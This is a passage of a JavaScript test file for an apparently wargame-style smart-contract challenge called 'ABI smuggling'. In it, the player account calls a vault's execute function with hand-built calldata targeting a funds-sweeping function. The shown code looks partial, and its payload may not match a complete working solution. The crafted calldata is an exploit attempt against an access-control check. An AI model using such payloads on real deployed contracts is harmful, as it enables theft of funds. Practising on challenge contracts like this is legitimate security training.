...
describe("[Challenge] ABI smuggling", function () {
  ...
  it("Execution", async function () {
    ...
    let functionSignature = ethers.utils.id("sweepFunds(address,address)");

    await vault
      .connect(player)
      .execute(
        vault.address,
        "0x85fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3"
      );
  });
